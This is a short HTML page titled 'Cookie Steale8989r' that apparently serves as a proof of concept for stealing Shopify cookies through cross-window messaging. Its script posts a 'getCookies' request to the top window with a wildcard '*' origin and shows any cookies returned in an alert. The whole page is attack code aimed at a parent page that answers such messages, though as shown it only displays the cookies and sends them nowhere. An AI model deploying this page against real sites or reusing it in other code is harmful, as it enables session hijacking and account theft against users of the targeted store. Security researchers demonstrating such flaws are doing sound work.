<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Steale8989r</title>
</head>
<body>
    <script>
        // Function to send a message to the parent window
        function sendMessageToParent() {
            const message = { type: 'getCookies' };
            window.top.postMessage(message, '*');
        }

        // Listen for messages from the parent window
        window.addEventListener('message', function(event) {
            if (event.data && event.data.type === 'cookies') {
                alert('Shopify Cookies: ' + event.data.cookies);
            }
        });

        // Send the initial message to the parent window
        sendMessageToParent();
    </script>
</body>
</html>
